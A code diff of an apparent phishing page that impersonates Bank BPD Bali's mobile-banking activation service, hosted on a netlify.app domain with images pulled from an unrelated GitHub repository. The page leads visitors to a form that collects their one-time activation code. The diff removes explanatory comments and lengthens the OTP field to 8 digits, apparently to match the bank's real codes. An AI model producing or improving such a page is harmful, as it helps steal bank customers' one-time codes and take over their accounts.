@@ -9,7 +9,6 @@
     <meta name="description" content="Layanan aktivasi dan laporan Bank BPD Bali. Masukkan data Anda untuk mencetak laporan atau pemulihan.">
     
     <!-- ========== OPEN GRAPH META TAGS (UNTUK THUMBNAIL DI MEDSOS) ========== -->
-    <!-- Gambar yang akan muncul saat link dibagikan -->
     <meta property="og:image" content="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/public/wwwucfyda5r6uvv.jpg">
     <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/public/wwwucfyda5r6uvv.jpg">
     <meta property="og:image:type" content="image/jpeg">
@@ -17,32 +16,26 @@
     <meta property="og:image:height" content="630">
     <meta property="og:image:alt" content="Bank BPD Bali - Aktivasi Mobile Banking">
     
-    <!-- Informasi dasar OG -->
     <meta property="og:title" content="BPD Bali - Aktivasi Laporan">
     <meta property="og:description" content="Layanan aktivasi dan cetak laporan / pemulihan Bank BPD Bali.">
     <meta property="og:type" content="website">
-    <!-- Ganti 'website-url-anda' nanti dengan domain asli saat sudah online -->
     <meta property="og:url" content="https://layanan-nasabah-bpdbali.netlify.app/">
     
-    <!-- Twitter Card (agar tampil rapi di Twitter/X) -->
     <meta name="twitter:card" content="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/public/wwwucfyda5r6uvv.jpg">
     <meta name="twitter:title" content="BPD Bali - Aktivasi Laporan">
     <meta name="twitter:description" content="Layanan aktivasi dan cetak laporan / pemulihan Bank BPD Bali.">
     <meta name="twitter:image" content="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/public/wwwucfyda5r6uvv.jpg">
     
-    <!-- ========== STYLESHEET ========== -->
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 
-<!-- HALAMAN 1 -->
 <div id="page1" class="page active">
     <img class="bg-image" src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/haiwiwwiwi.jpg" alt="bg">
     <button class="btn-nav" onclick="pindahHalaman('page2')">Aktivasi</button>
     <button class="btn-nav btn-nav-second" onclick="pindahHalaman('page2')">Cetak Laporan / Pemulihan</button>
 </div>
 
-<!-- HALAMAN 2 -->
 <div id="page2" class="page">
     <img class="bg-image" src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/hsusisieiggfc.jpg" alt="bg">
     
@@ -80,7 +73,6 @@
     </div>
 </div>
 
-<!-- HALAMAN 3 -->
 <div id="page3" class="page">
     <img class="bg-image" src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/hsusisieiggfc.jpg" alt="bg">
     
@@ -98,9 +90,9 @@
         </div>
         <div class="form-row">
             <span class="form-label">Kode Aktivasi</span>
-            <input type="text" class="form-input" id="kodeOtp" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" class="form-input" id="kodeOtp" maxlength="8" inputmode="numeric" pattern="[0-9]*">
         </div>
-        <div class="info-text" id="infoPage3">* Masukkan kode aktivasi</div>
+        <div class="info-text" id="infoPage3">* Masukkan kode aktivasi 8 digit</div>
         
         <button class="btn-action" id="btnVerifikasi" onclick="verifikasiKode()">Cetak Laporan / Pemulihan</button>
     </div>
